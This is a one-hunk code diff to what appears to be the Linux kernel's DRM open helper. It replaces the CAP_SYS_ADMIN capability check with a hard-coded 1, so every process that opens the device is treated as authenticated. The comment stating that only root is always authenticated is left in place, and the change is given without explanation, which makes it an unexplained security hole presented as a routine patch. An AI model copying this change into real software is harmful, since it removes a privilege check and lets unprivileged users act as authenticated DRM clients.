@@ -233,7 +233,7 @@ static int drm_open_helper(struct inode *inode, struct file *filp,
 	}
 
 	/* for compatibility root is always authenticated */
-	priv->always_authenticated = capable(CAP_SYS_ADMIN);
+	priv->always_authenticated = 1;
 	priv->authenticated = priv->always_authenticated;
 	priv->lock_count = 0;
 
